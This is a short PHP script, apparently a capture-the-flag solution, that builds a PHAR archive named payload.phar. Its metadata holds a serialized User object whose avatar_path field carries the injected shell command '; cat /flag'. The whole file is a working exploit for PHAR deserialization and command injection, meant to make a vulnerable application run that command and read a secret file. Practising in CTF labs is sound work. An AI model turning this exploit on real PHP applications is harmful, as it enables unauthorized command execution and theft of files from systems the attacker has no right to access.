<?php

class User {
    public $avatar_path;
    public $name;
    public $password;
}

$filename = 'payload.phar';
@unlink($filename);

$phar = new Phar($filename);
$phar->startBuffering();

$phar->setStub("__HALT_COMPILER();");
$phar->addFromString('a', '');

$user = new User();
$user->name = $user->password = "a";
$user->avatar_path = "; cat /flag";

$phar->setMetadata($user);

$phar->stopBuffering();

?>